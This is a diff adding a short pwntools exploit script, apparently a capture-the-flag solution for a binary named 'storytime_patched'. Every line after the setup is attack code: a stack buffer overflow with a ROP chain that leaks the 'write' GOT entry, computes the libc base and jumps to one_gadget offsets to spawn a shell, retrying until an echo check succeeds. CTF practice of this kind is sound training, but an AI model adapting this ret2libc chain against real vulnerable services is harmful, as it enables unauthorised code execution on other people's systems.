@@ -1,0 +1,50 @@
+from pwn import *
+
+#p = process("./storytime_patched")
+'''
+p = gdb.debug("./storytime_patched", gdbscript = 
+b *main + 104
+b *climax
+r
+)
+'''
+
+e = ELF("./storytime_patched")
+libc = ELF("./libc.so.6")
+
+write_plt = e.plt['write']
+write_got = e.got['write']
+pop_rdi = 0x0000000000400703
+pop_rsi_r15 = 0x0000000000400701
+climax_func = e.symbols['climax']
+one_shot = [0x4526a, 0xf02a4, 0xf1147] 
+
+for i in range(3):
+    p = process("./storytime_patched")
+
+    payload = b"A" * 0x30 + b"B" * 8
+    payload += p64(pop_rdi) + p64(1)
+    payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)
+    payload += p64(write_plt)
+    payload += p64(climax_func)
+    p.sendafter(b"story: \n", payload)
+
+    libc_base = u64(p.recv(6) + b"\x00" * 2) - libc.symbols['write']
+    print(hex(libc_base))
+    p.recv(0x190 - 6)
+
+    payload = b"A" * 0x30 + b"B" * 8
+    payload += p64(libc_base + one_shot[i])
+    p.send(payload)
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil("vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+p.interactive()
